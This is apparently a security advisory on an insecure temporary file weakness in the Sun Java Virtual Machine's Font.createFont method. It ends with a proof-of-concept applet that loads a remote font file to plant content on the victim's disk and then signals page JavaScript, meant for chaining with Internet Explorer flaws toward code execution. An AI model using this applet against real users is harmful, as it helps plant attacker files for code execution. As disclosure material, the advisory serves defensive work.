Sun Java Virtual Machine is a component of the Sun Java infrastructure that performs the handling of Java applets and other programs. It is available for Unix, Linux, and Microsoft platforms.

Sun Java Virtual Machine is prone to an insecure temporary file creation weakness. It is reported that this file is created by the 'Font.createFont' method with the following name:

+~JFxxxxx.tmp

where xxxxx is a random number.

This issue can be combined with various other vulnerabilities in Internet Explorer to ultimately allow for code execution on a vulnerable computer.

import java.applet.Applet;

import java.awt.Font;

import java.net.URL;

import netscape.javascript.JSObject;



public class Jelmer extends Applet {



public void init() {



try {

Font f = Font.createFont(Font.TRUETYPE_FONT, new
URL(getParameter("infile")).openStream());

} catch(Exception ignored) {}



try {

JSObject jsWin = JSObject.getWindow(this);

jsWin.call("doneloading", new Object[]{});



} catch(Exception e) {

e.printStackTrace();

}

}

}
